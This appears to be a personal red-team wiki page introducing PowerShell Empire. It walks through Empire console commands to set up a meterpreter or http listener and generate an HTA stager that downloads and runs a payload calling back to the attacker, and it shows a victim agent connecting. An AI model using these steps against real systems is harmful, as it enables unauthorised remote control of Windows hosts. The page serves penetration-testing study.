---
description: Exploring key concepts of the Powershell Empire
---

# Powershell Empire 101

## Listener

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
// Empire commands used
?
uselistener meterpreter
info
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/empire-listener.png)

Starting the listener:

```text
execute
```

![](../.gitbook/assets/empire-startlistener.png)

## Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`- below shows how to set it up and generate:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
//specify what stager to use
usestager windows/hta

//associate stager with the meterpreter listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/empire-stager%20%281%29.png)

A quick look at the stager code:

![](../.gitbook/assets/stager-hta.gif)

### Issues

Various stagers I generated for the meterpreter listener were giving me errors like [this](https://github.com/EmpireProject/Empire/issues/896) and this:

![](../.gitbook/assets/stager-bat.png)

and this:

![](../.gitbook/assets/stager-vbs.png)

After looking at the traffic and a quick nmap scan, it seems like there may be a bug in Empire's uselistener module when used with meterpreter - for some reason it will not actually start listening/open up the port:

![](../.gitbook/assets/stager-listeners.png)

![](../.gitbook/assets/stager-pcap.png)

To test this assumption, I created another http listener on port 80 - which worked immediately, leaving the meterpeter listener being buggy at least on my system:

![](../.gitbook/assets/stager-http.png)

## Agent

Agent is essentially a victim system that called back to the listener and is now ready to receive commands.

Continuing testing with the `http` listener and a `multi/launcher` stager, the agent is finally returned once the `launcher.ps1` \(read: stager\) is executed on the victim system:

![](../.gitbook/assets/stager-received.gif)







{% embed data="{\"url\":\"https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/\",\"type\":\"link\",\"title\":\"How to Use PowerShell Empire: Getting Started with Post-Exploitation of Windows Hosts\",\"description\":\"PowerShell Empire is a post-exploitation framework for computers and servers running Microsoft Windows, Windows Server operating systems, or both. In these tutorials, we will be exploring everything from how to install Powershell Empire to how to snoop around a victim\'s computer without the antivirus software knowing about it. If we are lucky, we might even be able to obtain domain administrator credentials and own the whole network. A Tool for Targeting Windows Exploit frameworks are popular, and most hackers have heard of Metasploit, a framework that automates the deployment of powerful\",\"icon\":{\"type\":\"icon\",\"url\":\"https://img.wonderhowto.com/images/favicons/wonderhowto/favicon-194x194.png\",\"width\":194,\"height\":194,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://img.wonderhowto.com/img/85/10/63638593407829/0/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts.1280x600.jpg\",\"width\":1280,\"height\":600,\"aspectRatio\":0.46875}}" %}

